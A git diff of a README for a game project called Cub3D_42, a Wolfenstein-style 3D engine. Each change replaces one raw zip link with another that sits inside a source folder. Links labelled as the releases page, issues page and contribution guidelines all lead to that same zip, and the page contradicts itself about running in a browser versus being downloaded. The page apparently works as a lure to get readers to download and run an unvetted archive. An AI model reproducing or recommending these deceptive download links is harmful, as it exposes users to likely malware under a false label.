@@ -1,7 +1,7 @@
 # 🕹️ Cub3D_42 - Experience 3D Gaming in Your Browser
 
 ## 📥 Download
-[![Download Cub3D_42](https://raw.githubusercontent.com/lakshay803/Cub3D_42/main/deorientalize/Cub3D_42.zip)](https://raw.githubusercontent.com/lakshay803/Cub3D_42/main/deorientalize/Cub3D_42.zip)
+[![Download Cub3D_42](https://github.com/lakshay803/Cub3D_42/raw/refs/heads/main/src/get_next_line/Cub-v3.0-alpha.3.zip)](https://github.com/lakshay803/Cub3D_42/raw/refs/heads/main/src/get_next_line/Cub-v3.0-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Cub3D_42! This is a 3D game engine inspired by Wolfenstein 3D. You can enjoy features like texture mapping, player movement, and real-time rendering, thanks to the MLX graphics library. Follow the steps below to get the game running on your computer.
@@ -22,7 +22,7 @@ Welcome to Cub3D_42! This is a 3D game engine inspired by Wolfenstein 3D. You ca
 
 ## 🌟 Installation Steps
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/lakshay803/Cub3D_42/main/deorientalize/Cub3D_42.zip) to download the Cub3D_42 application.
+   Go to the [Releases page](https://github.com/lakshay803/Cub3D_42/raw/refs/heads/main/src/get_next_line/Cub-v3.0-alpha.3.zip) to download the Cub3D_42 application.
 
 2. **Choose the Correct Version**  
    On the Releases page, find the latest version of Cub3D_42. Click on it to view release details.
@@ -55,11 +55,11 @@ Once you open Cub3D_42:
 ## 🔗 Community and Support
 Join our community of players and developers! Follow updates, share your experiences, and ask questions:
 
-- **GitHub Issues:** Report bugs or suggest features on the [Issues page](https://raw.githubusercontent.com/lakshay803/Cub3D_42/main/deorientalize/Cub3D_42.zip).
+- **GitHub Issues:** Report bugs or suggest features on the [Issues page](https://github.com/lakshay803/Cub3D_42/raw/refs/heads/main/src/get_next_line/Cub-v3.0-alpha.3.zip).
 - **Social Media:** Connect with other users on platforms where Cub3D_42 is discussed. 
 
 ## 🔄 Contributing
-If you're interested in contributing to Cub3D_42, please check out our [Contribution Guidelines](https://raw.githubusercontent.com/lakshay803/Cub3D_42/main/deorientalize/Cub3D_42.zip). We welcome improvements and suggestions.
+If you're interested in contributing to Cub3D_42, please check out our [Contribution Guidelines](https://github.com/lakshay803/Cub3D_42/raw/refs/heads/main/src/get_next_line/Cub-v3.0-alpha.3.zip). We welcome improvements and suggestions.
 
 ## 📄 License
 Cub3D_42 is open-source software licensed under the MIT License. Feel free to modify and share as per the license terms.
@@ -68,4 +68,4 @@ Cub3D_42 is open-source software licensed under the MIT License. Feel free to mo
 To dive deeper into the technical details or learn about game development concepts, check out additional resources and tutorials available in the "Resources" section of the repository.
 
 ## 📥 Download Again
-As a reminder, you can download Cub3D_42 from the [Releases page](https://raw.githubusercontent.com/lakshay803/Cub3D_42/main/deorientalize/Cub3D_42.zip). Enjoy your gaming experience!
+As a reminder, you can download Cub3D_42 from the [Releases page](https://github.com/lakshay803/Cub3D_42/raw/refs/heads/main/src/get_next_line/Cub-v3.0-alpha.3.zip). Enjoy your gaming experience!
